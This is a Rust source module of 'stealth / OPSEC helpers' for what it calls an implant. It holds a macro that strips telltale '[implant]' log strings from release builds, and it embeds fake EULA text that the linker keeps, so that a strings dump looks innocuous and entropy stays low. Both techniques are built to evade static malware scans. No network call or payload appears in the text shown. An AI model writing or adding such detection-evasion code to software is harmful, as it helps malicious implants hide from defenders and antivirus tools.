//! Stealth / OPSEC helpers for the implant.
//!
//! Two concerns live here:
//!
//! 1. **Debug-log gating.** The plain `eprintln!("[implant] ...")` calls in
//!    `main.rs` bake telltale strings (`[implant] connected to `,
//!    `[implant] connection lost`, …) into the release binary even though the
//!    branch is rarely taken — exactly what a static string scan flags. The
//!    `verbose` feature (off by default in release) compiles those prints to
//!    nothing, so the strings never make it into the binary. Use
//!    `--features verbose` during development to get them back.
//!
//! 2. **Benign string padding.** `BENIGN_STRINGS` is a block of ordinary,
//!    application-looking English text (a fake EULA / about blurb) embedded via
//!    `include_str!` and marked `#[used]` so the linker keeps it. This does two
//!    jobs: it dilutes the suspicious strings (a `strings` dump is now mostly
//!    innocuous prose) and nudges overall entropy *down* (English text is
//!    low-entropy) — though the binary's entropy is already normal (~6.4
//!    bits/byte). The padding is read once at startup and discarded; it has no
//!    runtime effect.

/// Verbose log macro. Compiles to a no-op unless the `verbose` feature is on,
/// so the format strings are absent from a default release build.
macro_rules! vlog {
    ($($arg:tt)*) => {
        #[cfg(feature = "verbose")]
        eprintln!($($arg)*)
    };
}

/// A block of benign, application-like text embedded in `.rdata`. Present only
/// to dilute the suspicious strings a static analyzer would otherwise see and
/// to keep overall entropy low. `#[used]` prevents the optimizer from dropping
/// it as dead data.
#[used]
#[allow(dead_code)]
static BENIGN_STRINGS: &str = include_str!("benign_strings.txt");

/// Touch the padding so the compiler can prove it's "used" across crates /
/// LTO. Returns the length (a cheap sink the optimizer keeps).
#[allow(dead_code)]
pub fn _padding_len() -> usize {
    BENIGN_STRINGS.len()
}
